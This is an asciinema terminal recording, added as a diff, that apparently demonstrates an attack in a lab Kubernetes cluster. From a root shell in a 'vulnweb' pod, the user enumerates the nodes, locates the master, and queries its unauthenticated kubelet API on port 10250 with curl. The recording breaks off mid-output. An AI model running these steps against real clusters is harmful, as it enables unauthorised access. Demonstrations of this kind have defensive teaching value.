@@ -1,0 +1,2418 @@
+{
+  "version": 1,
+  "width": 90,
+  "height": 25,
+  "duration": 85.341397,
+  "command": "/bin/bash --rcfile ~/.bash_profile",
+  "title": null,
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.257935,
+      "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ],
+    [
+      0.660576,
+      "kubectl exec -i"
+    ],
+    [
+      6.1e-05,
+      "t vulnweb-"
+    ],
+    [
+      0.000134,
+      "2"
+    ],
+    [
+      5.7e-05,
+      "56994140"
+    ],
+    [
+      4.2e-05,
+      "5-"
+    ],
+    [
+      4.1e-05,
+      "q8"
+    ],
+    [
+      3.9e-05,
+      "v9"
+    ],
+    [
+      2.6e-05,
+      "r"
+    ],
+    [
+      0.000125,
+      " "
+    ],
+    [
+      5.3e-05,
+      "/bin/"
+    ],
+    [
+      3.9e-05,
+      "ba"
+    ],
+    [
+      3.1e-05,
+      "s"
+    ],
+    [
+      3.2e-05,
+      "h"
+    ],
+    [
+      0.512219,
+      "\r\n"
+    ],
+    [
+      0.355188,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "\r                                                                                         \rroot@vulnweb-2569941405-q8v9r:/# export TERM=xter"
+    ],
+    [
+      0.003318,
+      "m"
+    ],
+    [
+      0.307079,
+      "\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.653528,
+      "c"
+    ],
+    [
+      0.193099,
+      "l"
+    ],
+    [
+      0.065908,
+      "e"
+    ],
+    [
+      0.078673,
+      "a"
+    ],
+    [
+      0.068692,
+      "r"
+    ],
+    [
+      0.135202,
+      "\r\n"
+    ],
+    [
+      9.5e-05,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "kubectl get nodes -o yaml"
+    ],
+    [
+      0.641072,
+      "\r\n"
+    ],
+    [
+      0.287318,
+      "apiVersion: v1\r\nitems:\r\n- apiVersion: v1\r\n  kind: Node\r\n  metadata:\r\n    annotations:\r\n      node.alpha.kubernetes.io/ttl: \"0\"\r\n      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n    creationTimestamp: 2017-10-26T03:31:24Z\r\n    labels:\r\n      beta.kubernetes.io/arch: amd64\r\n      beta.kubernetes.io/instance-type: t2.medium\r\n      beta.kubernetes.io/os: linux\r\n      failure-domain.beta.kubernetes.io/region: us-east-1\r\n      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n      kubernetes.io/hostname: ip-172-20-42-228.ec2.internal\r\n      kubernetes.io/role: node\r\n      node-role.kubernetes.io/node: \"\"\r\n    name: ip-172-20-42-228.ec2.internal\r\n    namespace: \"\"\r\n    resourceVersion: \"12245\"\r\n    selfLink: /api/v1/nodes/ip-172-20-42-228.ec2.internal\r\n    uid: 24b7bfd1-b9fe-11e7-801a-06d2c9432f28\r\n  spec:\r\n    externalID: i-01fb6d4dda05da364\r\n    podCIDR: 100.96.2.0/24\r\n    providerID: aws:///us-east-1d/i-01fb6d4dda05da364\r\n  status:\r\n    addresses:\r\n    - address: 172.20.42.228\r\n      type:"
+    ],
+    [
+      0.000124,
+      " InternalIP\r\n    - address: 54.175.73.175\r\n      type: ExternalIP\r\n    - address: ip-172-20-42-228.ec2.internal\r\n      type: InternalDNS\r\n    - address: ec2-54-175-73-175.compute-1.amazonaws.com\r\n      type: ExternalDNS\r\n    - address: ip-172-20-42-228.ec2.internal\r\n      type: Hostname\r\n    allocatable:\r\n      cpu: \"2\"\r\n      memory: 3946916Ki\r\n      pods: \"110\"\r\n    capacity:\r\n      cpu: \"2\"\r\n      memory: 4049316Ki\r\n      pods: \"110\"\r\n    conditions:\r\n    - lastHeartbeatTime: 2017-10-26T06:01:22Z\r\n      lastTransitionTime: 2017-10-26T03:31:24Z\r\n      message: kubelet has sufficient disk space available\r\n      reason: KubeletHasSufficientDisk\r\n      status: \"False\"\r\n      type: OutOfDisk\r\n    - lastHeartbeatTime: 2017-10-26T06:01:22Z\r\n      lastTransitionTime: 2017-10-26T03:31:24Z\r\n      message: kubelet has sufficient memory available\r\n      reason: KubeletHasSufficientMemory\r\n      status: \"False\"\r\n      type: MemoryPressure\r\n    - lastHeartbeatTime: 2017-10-26T06:01:22Z\r\n      lastTransitionTime: 2017-10"
+    ],
+    [
+      0.000113,
+      "-26T03:31:24Z\r\n      message: kubelet has no disk pressure\r\n      reason: KubeletHasNoDiskPressure\r\n      status: \"False\"\r\n      type: DiskPressure\r\n    - lastHeartbeatTime: 2017-10-26T06:01:22Z\r\n      lastTransitionTime: 2017-10-26T03:31:44Z\r\n      message: kubelet is posting ready status\r\n      reason: KubeletReady\r\n      status: \"True\"\r\n      type: Ready\r\n    daemonEndpoints:\r\n      kubeletEndpoint:\r\n        Port: 10250\r\n    images:\r\n    - names:\r\n      - bradgeesaman/vulnapp@sha256:d4dd9e9f5cc247d82ee5624e5127acd13b6458b8fe40b49783d2122a146107ce\r\n      - bradgeesaman/vulnapp:latest\r\n      sizeBytes: 691502903\r\n    - names:\r\n      - protokube:1.7.0\r\n      sizeBytes: 363365587\r\n    - names:\r\n      - calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477\r\n      - calico/node:v1.2.1\r\n      sizeBytes: 255167939\r\n    - names:\r\n      - gcr.io/google_containers/kubernetes-dashboard-amd64@sha256:2c4421ed80358a0ee97b44357b6cd6dc09be6ccc27dfe9d50c9bfc39a760e5fe\r\n      - gcr.io/google_con"
+    ],
+    [
+      0.000371,
+      "tainers/kubernetes-dashboard-amd64:v1.6.3\r\n      sizeBytes: 138972432\r\n    - names:\r\n      - gcr.io/google_containers/kube-proxy@sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\r\n      - gcr.io/google_containers/kube-proxy:v1.7.4\r\n      sizeBytes: 114689319\r\n    - names:\r\n      - redis@sha256:07e7b6cb753f8d06a894e22af30f94e04844461ab6cb002c688841873e5e5116\r\n      - redis:latest\r\n      sizeBytes: 106612625\r\n    - names:\r\n      - calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c\r\n      - calico/cni:v1.8.3\r\n      sizeBytes: 67156232\r\n    - names:\r\n      - gcr.io/google_containers/cluster-proportional-autoscaler-amd64@sha256:003f98d9f411ddfa6ff6d539196355e03ddd69fa4ed38c7ffb8fec6f729afe2d\r\n      - gcr.io/google_containers/cluster-proportional-autoscaler-amd64:1.1.2-r2\r\n      sizeBytes: 49644153\r\n    - names:\r\n      - gcr.io/google_containers/k8s-dns-kube-dns-amd64@sha256:40790881bbe9ef4ae4ff7fe8b892498eecb7fe6dcc22661402f271e03f7de344\r\n      - gcr.io/google_"
+    ],
+    [
+      0.0001,
+      "containers/k8s-dns-kube-dns-amd64:1.14.4\r\n      sizeBytes: 49383112\r\n    - names:\r\n      - gcr.io/google_containers/k8s-dns-sidecar-amd64@sha256:97074c951046e37d3cbb98b82ae85ed15704a290cce66a8314e7f846404edde9\r\n      - gcr.io/google_containers/k8s-dns-sidecar-amd64:1.14.4\r\n      sizeBytes: 41814878\r\n    - names:\r\n      - gcr.io/google_containers/k8s-dns-dnsmasq-nanny-amd64@sha256:aeeb994acbc505eabc7415187cd9edb38cbb5364dc1c2fc748154576464b3dc2\r\n      - gcr.io/google_containers/k8s-dns-dnsmasq-nanny-amd64:1.14.4\r\n      sizeBytes: 41410758\r\n    - names:\r\n      - gcr.io/google_containers/pause-amd64@sha256:163ac025575b775d1c0f9bf0bdd0f086883171eb475b5068e7defa4ca9e76516\r\n      - gcr.io/google_containers/pause-amd64:3.0\r\n      sizeBytes: 746888\r\n    nodeInfo:\r\n      architecture: amd64\r\n      bootID: 1c156b9b-cb5c-4fea-94f6-fc8354294657\r\n      containerRuntimeVersion: docker://1.12.6\r\n      kernelVersion: 4.4.78-k8s\r\n      kubeProxyVersion: v1.7.4\r\n      kubeletVersion: v1.7.4\r\n      machineID: e8dedea44d0c43f2a8"
+    ],
+    [
+      0.000591,
+      "ef06bd1d7a707a\r\n      operatingSystem: linux\r\n      osImage: Debian GNU/Linux 8 (jessie)\r\n      systemUUID: EC27149F-F73E-5E49-ED16-C1012FA3EBBC\r\n- apiVersion: v1\r\n  kind: Node\r\n  metadata:\r\n    annotations:\r\n      node.alpha.kubernetes.io/ttl: \"0\"\r\n      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n    creationTimestamp: 2017-10-26T03:31:14Z\r\n    labels:\r\n      beta.kubernetes.io/arch: amd64\r\n      beta.kubernetes.io/instance-type: t2.medium\r\n      beta.kubernetes.io/os: linux\r\n      failure-domain.beta.kubernetes.io/region: us-east-1\r\n      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n      kubernetes.io/hostname: ip-172-20-48-188.ec2.internal\r\n      kubernetes.io/role: node\r\n      node-role.kubernetes.io/node: \"\"\r\n    name: ip-172-20-48-188.ec2.internal\r\n    namespace: \"\"\r\n    resourceVersion: \"12246\"\r\n    selfLink: /api/v1/nodes/ip-172-20-48-188.ec2.internal\r\n    uid: 1eef91d3-b9fe-11e7-801a-06d2c9432f28\r\n  spec:\r\n    externalID: i-07e49bdf8370695dc\r\n    podCIDR: 100.96.1.0/24\r\n "
+    ],
+    [
+      0.000125,
+      "   providerID: aws:///us-east-1d/i-07e49bdf8370695dc\r\n  status:\r\n    addresses:\r\n    - address: 172.20.48.188\r\n      type: InternalIP\r\n    - address: 54.234.59.44\r\n      type: ExternalIP\r\n    - address: ip-172-20-48-188.ec2.internal\r\n      type: InternalDNS\r\n    - address: ec2-54-234-59-44.compute-1.amazonaws.com\r\n      type: ExternalDNS\r\n    - address: ip-172-20-48-188.ec2.internal\r\n      type: Hostname\r\n    allocatable:\r\n      cpu: \"2\"\r\n      memory: 3946916Ki\r\n      pods: \"110\"\r\n    capacity:\r\n      cpu: \"2\"\r\n      memory: 4049316Ki\r\n      pods: \"110\"\r\n    conditions:\r\n    - lastHeartbeatTime: 2017-10-26T06:01:23Z\r\n      lastTransitionTime: 2017-10-26T03:31:14Z\r\n      message: kubelet has sufficient disk space available\r\n      reason: KubeletHasSufficientDisk\r\n      status: \"False\"\r\n      type: OutOfDisk\r\n    - lastHeartbeatTime: 2017-10-26T06:01:23Z\r\n      lastTransitionTime: 2017-10-26T03:31:14Z\r\n      message: kubelet has sufficient memory available\r\n      reason: KubeletHasSufficientMemory\r\n      statu"
+    ],
+    [
+      7e-05,
+      "s: \"False\"\r\n      type: MemoryPressure\r\n    - lastHeartbeatTime: 2017-10-26T06:01:23Z\r\n      lastTransitionTime: 2017-10-26T03:31:14Z\r\n      message: kubelet has no disk pressure\r\n      reason: KubeletHasNoDiskPressure\r\n      status: \"False\"\r\n      type: DiskPressure\r\n    - lastHeartbeatTime: 2017-10-26T06:01:23Z\r\n      lastTransitionTime: 2017-10-26T03:31:25Z\r\n      message: kubelet is posting ready status\r\n      reason: KubeletReady\r\n      status: \"True\"\r\n      type: Ready\r\n    daemonEndpoints:\r\n      kubeletEndpoint:\r\n        Port: 10250\r\n    images:\r\n    - names:\r\n      - microsoft/azure-vote-front@sha256:1c7abbebcfc00dab064c7a5ea7ddb9ad3c6a9ecc5c8a99a42cebc2aa833e1fe7\r\n      - microsoft/azure-vote-front:redis-v1\r\n      sizeBytes: 694209617\r\n    - names:\r\n      - bradgeesaman/vulnapp@sha256:d4dd9e9f5cc247d82ee5624e5127acd13b6458b8fe40b49783d2122a146107ce\r\n      - bradgeesaman/vulnapp:latest\r\n      sizeBytes: 691502903\r\n    - names:\r\n      - protokube:1.7.0\r\n      sizeBytes: 363365587\r\n    - names:\r\n      "
+    ],
+    [
+      0.000457,
+      "- calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477\r\n      - calico/node:v1.2.1\r\n      sizeBytes: 255167939\r\n    - names:\r\n      - gcr.io/google_containers/kube-proxy@sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\r\n      - gcr.io/google_containers/kube-proxy:v1.7.4\r\n      sizeBytes: 114689319\r\n    - names:\r\n      - calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c\r\n      - calico/cni:v1.8.3\r\n      sizeBytes: 67156232\r\n    - names:\r\n      - gcr.io/google_containers/k8s-dns-kube-dns-amd64@sha256:40790881bbe9ef4ae4ff7fe8b892498eecb7fe6dcc22661402f271e03f7de344\r\n      - gcr.io/google_containers/k8s-dns-kube-dns-amd64:1.14.4\r\n      sizeBytes: 49383112\r\n    - names:\r\n      - gcr.io/google_containers/k8s-dns-sidecar-amd64@sha256:97074c951046e37d3cbb98b82ae85ed15704a290cce66a8314e7f846404edde9\r\n      - gcr.io/google_containers/k8s-dns-sidecar-amd64:1.14.4\r\n      sizeBytes: 41814878\r\n    - names:\r\n      - gcr.io/google_containe"
+    ],
+    [
+      0.000149,
+      "rs/k8s-dns-dnsmasq-nanny-amd64@sha256:aeeb994acbc505eabc7415187cd9edb38cbb5364dc1c2fc748154576464b3dc2\r\n      - gcr.io/google_containers/k8s-dns-dnsmasq-nanny-amd64:1.14.4\r\n      sizeBytes: 41410758\r\n    - names:\r\n      - bradgeesaman/auditcon@sha256:921430c0d2bdedd2854a3b72967812ed74c5775edd23df4c772870c202d54e12\r\n      - bradgeesaman/auditcon:latest\r\n      sizeBytes: 8749945\r\n    - names:\r\n      - gcr.io/google_containers/pause-amd64@sha256:163ac025575b775d1c0f9bf0bdd0f086883171eb475b5068e7defa4ca9e76516\r\n      - gcr.io/google_containers/pause-amd64:3.0\r\n      sizeBytes: 746888\r\n    nodeInfo:\r\n      architecture: amd64\r\n      bootID: 76e9286b-c201-42f2-bae0-1634a9dd9bc1\r\n      containerRuntimeVersion: docker://1.12.6\r\n      kernelVersion: 4.4.78-k8s\r\n      kubeProxyVersion: v1.7.4\r\n      kubeletVersion: v1.7.4\r\n      machineID: 8cf9353516d543fb892bf50742768af0\r\n      operatingSystem: linux\r\n      osImage: Debian GNU/Linux 8 (jessie)\r\n      systemUUID: EC2AF078-9BC7-6C82-32FB-C07200E2B440\r\n- apiVersion: v1\r\n"
+    ],
+    [
+      0.000447,
+      "  kind: Node\r\n  metadata:\r\n    annotations:\r\n      node.alpha.kubernetes.io/ttl: \"0\"\r\n      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n    creationTimestamp: 2017-10-26T03:28:39Z\r\n    labels:\r\n      beta.kubernetes.io/arch: amd64\r\n      beta.kubernetes.io/instance-type: m3.medium\r\n      beta.kubernetes.io/os: linux\r\n      failure-domain.beta.kubernetes.io/region: us-east-1\r\n      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n      kubernetes.io/hostname: ip-172-20-57-249.ec2.internal\r\n      kubernetes.io/role: master\r\n      node-role.kubernetes.io/master: \"\"\r\n    name: ip-172-20-57-249.ec2.internal\r\n    namespace: \"\"\r\n    resourceVersion: \"12242\"\r\n    selfLink: /api/v1/nodes/ip-172-20-57-249.ec2.internal\r\n    uid: c25a65c8-b9fd-11e7-aa33-06d2c9432f28\r\n  spec:\r\n    externalID: i-09c9c706043a20f04\r\n    podCIDR: 100.96.0.0/24\r\n    providerID: aws:///us-east-1d/i-09c9c706043a20f04\r\n    taints:\r\n    - effect: NoSchedule\r\n      key: node-role.kubernetes.io/master\r\n      timeAdded: null\r\n "
+    ],
+    [
+      0.000123,
+      " status:\r\n    addresses:\r\n    - address: 172.20.57.249\r\n      type: InternalIP\r\n    - address: 52.91.151.221\r\n      type: ExternalIP\r\n    - address: ip-172-20-57-249.ec2.internal\r\n      type: InternalDNS\r\n    - address: ec2-52-91-151-221.compute-1.amazonaws.com\r\n      type: ExternalDNS\r\n    - address: ip-172-20-57-249.ec2.internal\r\n      type: Hostname\r\n    allocatable:\r\n      cpu: \"1\"\r\n      memory: 3754892Ki\r\n      pods: \"110\"\r\n    capacity:\r\n      cpu: \"1\"\r\n      memory: 3857292Ki\r\n      pods: \"110\"\r\n    conditions:\r\n    - lastHeartbeatTime: 2017-10-26T06:01:20Z\r\n      lastTransitionTime: 2017-10-26T03:28:39Z\r\n      message: kubelet has sufficient disk space available\r\n      reason: KubeletHasSufficientDisk\r\n      status: \"False\"\r\n      type: OutOfDisk\r\n    - lastHeartbeatTime: 2017-10-26T06:01:20Z\r\n      lastTransitionTime: 2017-10-26T03:28:39Z\r\n      message: kubelet has sufficient memory available\r\n      reason: KubeletHasSufficientMemory\r\n      status: \"False\"\r\n      type: MemoryPressure\r\n    - lastHea"
+    ],
+    [
+      7.6e-05,
+      "rtbeatTime: 2017-10-26T06:01:20Z\r\n      lastTransitionTime: 2017-10-26T03:28:39Z\r\n      message: kubelet has no disk pressure\r\n      reason: KubeletHasNoDiskPressure\r\n      status: \"False\"\r\n      type: DiskPressure\r\n    - lastHeartbeatTime: 2017-10-26T06:01:20Z\r\n      lastTransitionTime: 2017-10-26T03:30:01Z\r\n      message: kubelet is posting ready status\r\n      reason: KubeletReady\r\n      status: \"True\"\r\n      type: Ready\r\n    daemonEndpoints:\r\n      kubeletEndpoint:\r\n        Port: 10250\r\n    images:\r\n    - names:\r\n      - protokube:1.7.0\r\n      sizeBytes: 363365587\r\n    - names:\r\n      - calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477\r\n      - calico/node:v1.2.1\r\n      sizeBytes: 255167939\r\n"
+    ],
+    [
+      0.002057,
+      "    - names:\r\n      - gcr.io/google_containers/kube-apiserver@sha256:f880371b4cee1a810d7caf4c8a2c0b8fa169879545b06a537e4ea6bcdfbbe1f6\r\n      - gcr.io/google_containers/kube-apiserver:v1.7.4\r\n      sizeBytes: 186095535\r\n    - names:\r\n      - gcr.io/google_containers/kube-controller-manager@sha256:7e31b7f71a8c1904c8b38c1681666ef551d0598fbbb4142522b05074ae0c9fd1\r\n      - gcr.io/google_containers/kube-controller-manager:v1.7.4\r\n      sizeBytes: 137980548\r\n    - names:\r\n      - kope/dns-controller@sha256:3d2f1ed56fbc555b703d3039f9f1b327cba4b25094c60534502558d14aebf9b5\r\n      - kope/dns-controller:1.7.1\r\n      sizeBytes: 122184966\r\n    - names:\r\n      - gcr.io/google_containers/kube-proxy@sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\r\n      - gcr.io/google_containers/kube-proxy:v1.7.4\r\n      sizeBytes: 114689319\r\n    - names:\r\n      - gcr.io/google_containers/kube-scheduler@sha256:3712116f370e21938e6a55e0f73dc02a4a6f4830a33304127105ed89451ee527\r\n      - gcr.io/google_containers/kube-schedu"
+    ],
+    [
+      0.000207,
+      "ler:v1.7.4\r\n      sizeBytes: 77204067\r\n    - names:\r\n      - calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c\r\n      - calico/cni:v1.8.3\r\n      sizeBytes: 67156232\r\n    - names:\r\n      - gcr.io/google_containers/etcd@sha256:19544a655157fb089b62d4dac02bbd095f82ca245dd5e31dd1684d175b109947\r\n      - gcr.io/google_containers/etcd:2.2.1\r\n      sizeBytes: 28191895\r\n    - names:\r\n      - calico/kube-policy-controller@sha256:54b4872a6fff0c8278266d05108da190f374b9500079769306047fc3da30d771\r\n      - calico/kube-policy-controller:v0.6.0\r\n      sizeBytes: 22730130\r\n    - names:\r\n      - gcr.io/google_containers/pause-amd64@sha256:163ac025575b775d1c0f9bf0bdd0f086883171eb475b5068e7defa4ca9e76516\r\n      - gcr.io/google_containers/pause-amd64:3.0\r\n      sizeBytes: 746888\r\n    nodeInfo:\r\n      architecture: amd64\r\n      bootID: dc6d5dc1-a465-43d0-994a-557fd4f22729\r\n      containerRuntimeVersion: docker://1.12.6\r\n      kernelVersion: 4.4.78-k8s\r\n      kubeProxyVersion: v1.7.4\r\n      kubeletVer"
+    ],
+    [
+      0.000181,
+      "sion: v1.7.4\r\n      machineID: 904c0523cb8742ec9cbeeac03e862c15\r\n      operatingSystem: linux\r\n      osImage: Debian GNU/Linux 8 (jessie)\r\n      systemUUID: EC22008B-16A9-F129-F282-09B71C8112FF\r\nkind: List\r\nmetadata:\r\n  resourceVersion: \"\"\r\n  selfLink: \"\"\r\nroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.391487,
+      "/"
+    ],
+    [
+      0.20331,
+      "m"
+    ],
+    [
+      0.113123,
+      "a"
+    ],
+    [
+      0.100487,
+      "s"
+    ],
+    [
+      0.157552,
+      "t"
+    ],
+    [
+      0.100667,
+      "e"
+    ],
+    [
+      0.112703,
+      "r"
+    ],
+    [
+      0.470848,
+      "\b\u001b[K"
+    ],
+    [
+      0.169518,
+      "\b\u001b[K"
+    ],
+    [
+      0.146733,
+      "\b\u001b[K"
+    ],
+    [
+      0.134966,
+      "\b\u001b[K"
+    ],
+    [
+      0.159941,
+      "\b\u001b[K"
+    ],
+    [
+      0.144247,
+      "\b\u001b[K"
+    ],
+    [
+      0.133029,
+      "\b\u001b[K"
+    ],
+    [
+      0.202687,
+      "\u0007"
+    ],
+    [
+      0.529799,
+      "kubectl get nodes -o yaml"
+    ],
+    [
+      0.349292,
+      " "
+    ],
+    [
+      0.21451,
+      "|"
+    ],
+    [
+      0.214388,
+      " "
+    ],
+    [
+      0.189311,
+      "l"
+    ],
+    [
+      0.10304,
+      "e"
+    ],
+    [
+      0.156127,
+      "s"
+    ],
+    [
+      0.124174,
+      "s"
+    ],
+    [
+      0.133923,
+      "\r\n"
+    ],
+    [
+      0.002942,
+      "\u001b[?1049h\u001b[?1h\u001b=\r"
+    ],
+    [
+      0.108373,
+      "apiVersion: v1\r\nitems:\r\n- apiVersion: v1\r\n  kind: Node\r\n  metadata:\r\n    annotations:\r\n      node.alpha.kubernetes.io/ttl: \"0\"\r\n      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n    creationTimestamp: 2017-10-26T03:31:24Z\r\n    labels:\r\n      beta.kubernetes.io/arch: amd64\r\n      beta.kubernetes.io/instance-type: t2.medium\r\n      beta.kubernetes.io/os: linux\r\n      failure-domain.beta.kubernetes.io/region: us-east-1\r\n      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n      kubernetes.io/hostname: ip-172-20-42-228.ec2.internal\r\n      kubernetes.io/role: node\r\n      node-role.kubernetes.io/node: \"\"\r\n    name: ip-172-20-42-228.ec2.internal\r\n    namespace: \"\"\r\n    resourceVersion: \"12245\"\r\n    selfLink: /api/v1/nodes/ip-172-20-42-228.ec2.internal\r\n    uid: 24b7bfd1-b9fe-11e7-801a-06d2c9432f28\r\n  spec:\r\n:\u001b[K"
+    ],
+    [
+      0.21489,
+      "\r\u001b[K/"
+    ],
+    [
+      0.158736,
+      "\u001b[Km\bm"
+    ],
+    [
+      0.156452,
+      "\u001b[Ka\ba"
+    ],
+    [
+      0.078865,
+      "\u001b[Ks\bs"
+    ],
+    [
+      0.181381,
+      "\u001b[Kt\bt"
+    ],
+    [
+      0.11232,
+      "\u001b[Ke\be"
+    ],
+    [
+      0.099612,
+      "\u001b[Kr\br"
+    ],
+    [
+      0.10336,
+      "\r\u001b[K"
+    ],
+    [
+      0.00022,
+      "\u001b[1;1HapiVersion: v1\r\n\u001b[2;1Hitems:\r\n\u001b[3;1H- apiVersion: v1\r\n\u001b[4;1H  kind: Node\r\n\u001b[5;1H  metadata:\r\n\u001b[6;1H    annotations:\r\n\u001b[7;1H      node.alpha.kubernetes.io/ttl: \"0\"\r\n\u001b[8;1H      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n\u001b[9;1H    creationTimestamp: 2017-10-26T03:31:24Z\r\n\u001b[10;1H    labels:\r\n\u001b[11;1H      beta.kubernetes.io/arch: amd64\r\n\u001b[12;1H      beta.kubernetes.io/instance-type: t2.medium\r\n\u001b[13;1H      beta.kubernetes.io/os: linux\r\n\u001b[14;1H      failure-domain.beta.kubernetes.io/region: us-east-1\r\n\u001b[15;1H      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n\u001b[16;1H      kubernetes.io/hostname: ip-172-20-42-228.ec2.internal\r\n\u001b[17;1H      kubernetes.io/role: node\r\n\u001b[18;1H      node-role.kubernetes.io/node: \"\"\r\n\u001b[19;1H    name: ip-172-20-42-228.ec2.internal\r\n\u001b[20;1H    namespace: \"\"\r\n\u001b[21;1H    resourceVersion: \"12245\"\r\n\u001b[22;1H    selfLink: /api/v1/nodes/ip-172-20-42-228.ec2.internal\r\n\u001b[23;1H    uid: 24b7bfd1-b9fe-11e7-801a-06d2c9432f28\r\n\u001b[24;1H  spec:\r\n\u001b[25;1H\u001b[1;1HapiVersion: v1\r\n"
+    ],
+    [
+      9.7e-05,
+      "\u001b[2;1Hitems:\r\n\u001b[3;1H- api"
+    ],
+    [
+      0.000405,
+      "Version: v1\r\n\u001b[4;1H  kind: Node\r\n\u001b[5;1H  metadata:\r\n\u001b[6;1H    annotations:\r\n\u001b[7;1H      node.alpha.kubernetes.io/ttl: \"0\"\r\n\u001b[8;1H      volumes.kubernetes.io/controller-managed-attach-detach: \"true\"\r\n\u001b[9;1H    creationTimestamp: 2017-10-26T03:31:24Z\r\n\u001b[10;1H    labels:\r\n\u001b[11;1H      beta.kubernetes.io/arch: amd64\r\n\u001b[12;1H      beta.kubernetes.io/instance-type: t2.medium\r\n\u001b[13;1H      beta.kubernetes.io/os: linux\r\n\u001b[14;1H      failure-domain.beta.kubernetes.io/region: us-east-1\r\n\u001b[15;1H      failure-domain.beta.kubernetes.io/zone: us-east-1d\r\n\u001b[16;1H      kubernetes.io/hostname: ip-172-20-42-228.ec2.internal\r\n\u001b[17;1H      kubernetes.io/role: node\r\n\u001b[18;1H      node-role.kubernetes.io/node: \"\"\r\n\u001b[19;1H    name: ip-172-20-42-228.ec2.internal\r\n\u001b[20;1H    namespace: \"\"\r\n\u001b[21;1H    resourceVersion: \"12245\"\r\n\u001b[22;1H    selfLink: /api/v1/nodes/ip-172-20-42-228.ec2.internal\r\n\u001b[23;1H    uid: 24b7bfd1-b9fe-11e7-801a-06d2c9432f28\r\n\u001b[24;1H  spec:\r\n\u001b[25;1H"
+    ],
+    [
+      0.002079,
+      "...skipping...\r\n      kubernetes.io/role: \u001b[7mmaster\u001b[27m\r\n      node-role.kubernetes.io/\u001b[7mmaster\u001b[27m: \"\"\r\n    name: ip-172-20-57-249.ec2.internal\r\n    namespace: \"\"\r\n    resourceVersion: \"12242\"\r\n    selfLink: /api/v1/nodes/ip-172-20-57-249.ec2.internal\r\n    uid: c25a65c8-b9fd-11e7-aa33-06d2c9432f28\r\n  spec:\r\n    externalID: i-09c9c706043a20f04\r\n    podCIDR: 100.96.0.0/24\r\n    providerID: aws:///us-east-1d/i-09c9c706043a20f04\r\n    taints:\r\n    - effect: NoSchedule\r\n      key: node-role.kubernetes.io/\u001b[7mmaster\u001b[27m\r\n      timeAdded: null\r\n  status:\r\n    addresses:\r\n    - address: 172.20.57.249\r\n      type: InternalIP\r\n    - address: 52.91.151.221\r\n      type: ExternalIP\r\n    - address: ip-172-20-57-249.ec2.internal\r\n      type: InternalDNS\r\n    - address: ec2-52-91-151-221.compute-1.amazonaws.com\r\n:\u001b[K"
+    ],
+    [
+      2.0,
+      "\r\u001b[K\u001b[?1l\u001b>\u001b[?1049lroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.484413,
+      "c"
+    ],
+    [
+      0.112624,
+      "l"
+    ],
+    [
+      0.088681,
+      "e"
+    ],
+    [
+      0.058861,
+      "a"
+    ],
+    [
+      0.064681,
+      "r"
+    ],
+    [
+      0.113254,
+      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.261929,
+      "curl -sk https://172.20.57.249:10250/runningpods/"
+    ],
+    [
+      1.497252,
+      "\r\n"
+    ],
+    [
+      0.00838,
+      "{\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"kube-apiserver-ip-172-20-57-249.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"2437aa649d8bda53cdb7c7abeaf89cb6\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"kube-apiserver\",\"image\":\"gcr.io/google_containers/kube-apiserver@sha256:f880371b4cee1a810d7caf4c8a2c0b8fa169879545b06a537e4ea6bcdfbbe1f6\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"calico-node-6s57z\",\"namespace\":\"kube-system\",\"uid\":\"d43089db-b9fd-11e7-aa33-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"calico-node\",\"image\":\"calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477\",\"resources\":{}},{\"name\":\"install-cni\",\"image\":\"calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"kube-scheduler-ip-172-20-57-249.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"1eeb8bc176e4b15f125c5c07a60cbb89\",\"creationTimestamp\":null},\"spec\":{"
+    ],
+    [
+      0.0002,
